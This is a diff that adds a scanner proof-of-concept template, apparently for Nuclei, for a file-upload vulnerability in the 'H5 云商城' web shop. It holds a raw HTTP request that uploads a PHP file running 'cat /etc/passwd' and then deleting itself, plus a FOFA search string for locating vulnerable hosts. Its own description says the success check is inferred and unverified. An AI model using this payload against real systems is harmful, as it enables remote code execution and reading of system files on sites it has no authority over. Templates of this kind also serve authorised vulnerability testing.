@@ -1,0 +1,39 @@
+id: poc-sxhwlgyqfr9cvqre
+info:
+  name: H5 云商城 file.php 文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sxhwlgyqfr9cvqre
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: sxhwlgyqfr9cvqre
+    fofa: body="/public/qbsp.php"
+http:
+- raw:
+  - 'POST /admin/commodtiy/file.php?upload=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFQqYtrIWb8iBxUCx
+
+
+    ------WebKitFormBoundaryFQqYtrIWb8iBxUCx
+
+    Content-Disposition: form-data; name="file"; filename="rce.php"
+
+    Content-Type: application/octet-stream
+
+
+    <?php system("cat /etc/passwd");unlink(__FILE__);?>
+
+    ------WebKitFormBoundaryFQqYtrIWb8iBxUCx--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
